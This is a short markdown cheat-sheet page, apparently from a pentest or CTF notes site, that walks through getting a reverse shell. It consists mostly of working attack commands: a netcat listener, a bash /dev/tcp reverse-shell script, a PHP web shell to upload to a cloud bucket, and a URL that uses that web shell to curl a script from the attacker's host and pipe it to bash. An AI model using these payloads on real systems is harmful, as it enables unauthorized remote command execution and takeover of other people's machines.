---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Reverse Shell

## <mark style="color:purple;">Basic bash script</mark>

* Stablish a listening port on the host machine with _netcat_

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc -nlvp $port     #An arbitrarie port 
```
{% endcode %}

***

* Use script to sent remote shell to the listening port

{% code title="RevShell.sh" overflow="wrap" lineNumbers="true" %}
```sh
#!/bin/bash

bash -i >& /dev/tcp/$ip/$port 0>&1
```
{% endcode %}

{% hint style="info" %}
* `$port`is the port listening with _netcat_ and `$ip` the host machine IP
* If you are using a VPN `$ip` is the IP assigned by the VPN instead of the host IP
* Remember also to give execution permissions to the script
{% endhint %}

***



## <mark style="color:purple;">For awscli</mark>

* Check if we have remote command execution

{% code overflow="wrap" lineNumbers="true" %}
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php #Upload in the bucket
http://$url/shell.php?cmd=id #On browser, if response we have access
```
{% endcode %}

***

* Create bash file for reverse shell

{% code overflow="wrap" lineNumbers="true" %}
```bash
#!/bin/bash 
bash -i >& /dev/tcp/$myip/$portcat 0>&1 #Arbitrary port
```
{% endcode %}

***

* Listen with netcat

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc -nvlp $portcat
```
{% endcode %}

***

* Create a server with python

{% code overflow="wrap" lineNumbers="true" %}
```bash
python3 -m http.server $port #Must be created at the same place where the reverse shell script is
```
{% endcode %}

***

* Make curl from local server to get reverse shell file and pass it to bash of the machine

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://$url/shell.php?cmd=curl%20$myip:$portpy/$shfile|bash
```
{% endcode %}

***

